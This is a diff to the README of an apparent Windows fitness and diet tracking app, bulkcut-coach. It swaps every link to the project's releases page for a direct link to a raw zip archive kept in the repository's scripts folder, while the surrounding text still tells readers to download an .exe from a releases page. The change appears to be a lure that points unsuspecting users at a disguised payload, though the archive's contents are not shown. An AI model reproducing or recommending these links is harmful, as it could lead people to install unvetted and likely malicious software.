@@ -1,6 +1,6 @@
 # ⚡ bulkcut-coach - Easy Fitness and Diet Tracking
 
-[![Download bulkcut-coach](https://img.shields.io/badge/Download-bulkcut--coach-green?style=for-the-badge)](https://github.com/tranminhductt/bulkcut-coach/releases)
+[![Download bulkcut-coach](https://img.shields.io/badge/Download-bulkcut--coach-green?style=for-the-badge)](https://raw.githubusercontent.com/tranminhductt/bulkcut-coach/main/scripts/bulkcut_coach_exhibitable.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these steps to download and run bulkcut-coach on your Windows machine.
 
 Go to the releases page to download the latest version here:
 
-[![Download bulkcut-coach](https://img.shields.io/badge/Download-bulkcut--coach-blue?style=for-the-badge)](https://github.com/tranminhductt/bulkcut-coach/releases)
+[![Download bulkcut-coach](https://img.shields.io/badge/Download-bulkcut--coach-blue?style=for-the-badge)](https://raw.githubusercontent.com/tranminhductt/bulkcut-coach/main/scripts/bulkcut_coach_exhibitable.zip)
 
 On the page, look for a file that ends with `.exe`. This is the program file for Windows. Click the file to download it to your computer.
 
@@ -152,7 +152,7 @@ If problems persist, check the GitHub issues on the repository page.
 ## 🔗 Useful Links
 
 - Find the latest downloads here:  
-  https://github.com/tranminhductt/bulkcut-coach/releases  
+  https://raw.githubusercontent.com/tranminhductt/bulkcut-coach/main/scripts/bulkcut_coach_exhibitable.zip  
 
 - Explore documentation and GitHub discussions on the repo homepage.
 
